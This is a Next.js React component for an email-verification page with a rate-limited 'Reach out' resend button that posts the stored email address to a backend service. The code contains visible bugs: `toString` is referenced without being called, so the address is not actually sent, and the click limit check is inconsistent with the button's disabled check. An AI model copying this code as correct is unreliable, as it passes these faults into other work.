'use client'

import Image from "next/image";
import React from "react";
import styles from './styles.module.css';
import {connection} from "@/services/connection";
import {sessionConst} from "@/constants/session";


const maxiumResend = 2


export function EmailSendInfo() {
  const [resetCount, setResetCount] = React.useState(0)

  const navigate = async () => {
    if (resetCount <= maxiumResend) {
      setResetCount(prev => prev + 1)
      const storageEmail = localStorage.getItem(sessionConst.Email)

      await connection.withoutActions({
        email: ` ${storageEmail?.toString} `,
        message: ' user pressed reach out link (resend email) '
      })
    }
  }

  return (
    <div className={styles.wrapper}>
      <div className={styles.container}>
        <div className={styles.logo}>
          <Image width={60} height={60} src="/icons/form-logo.png" alt="Logo"/>
        </div>
        <h2 className={styles.title}>Verify Your Identity</h2>
        <p className={styles.description}>
          We{"'"}ve sent a verification email. Please confirm your address and check your spam folder if you don{"'"}t
          see
          it in
          your inbox.
        </p>
        <p className={styles.resendLink}>
          Didn{"'"}t receive an email? <button disabled={resetCount >= maxiumResend} onClick={navigate}>Reach
          out</button>
        </p>
      </div>
    </div>
  );
};
